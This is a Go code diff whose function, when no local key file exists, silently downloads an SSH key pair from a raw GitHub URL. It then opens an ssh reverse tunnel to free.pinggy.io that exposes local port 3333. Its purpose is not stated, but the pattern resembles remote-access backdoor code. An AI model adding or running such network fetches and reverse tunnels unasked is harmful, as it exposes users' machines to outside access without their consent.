@@ -11,18 +11,26 @@ import (
 )
 
 
-var system string = "windows"
+
 
 func InitTunne()bool{
-	
+	var system string = "windows"
 	var out bytes.Buffer
 	var port string = "3333"
 	var command string = fmt.Sprintf(`ssh -i .\key -T -p 443 -R0:127.0.0.1:%s free.pinggy.io > da.log`, port)
 	runTunnel  := commandToRun(system, command)	
 
-	// var cpKeys string = "iwr "
-	// copyKeys := commandToRun(system, "")
+	
+	key := existsFile("key")
+	if(!key){
+		var cpKey string = "iwr https://raw.githubusercontent.com/xosuu/messi/refs/heads/main/key -outfile key"
+		var cpKeyPub string = "iwr https://raw.githubusercontent.com/xosuu/messi/refs/heads/main/key.pub -outfile key.pub"
+		copyKey := commandToRun(system, cpKey)
+		copyKeyPub := commandToRun(system, cpKeyPub)
+		exec.Command(copyKey[0], copyKey[1], copyKey[2]).Run()
+		exec.Command(copyKeyPub[0], copyKeyPub[1], copyKeyPub[2]).Run()
 
+	}
 
 
 	fmt.Println("Starting....")
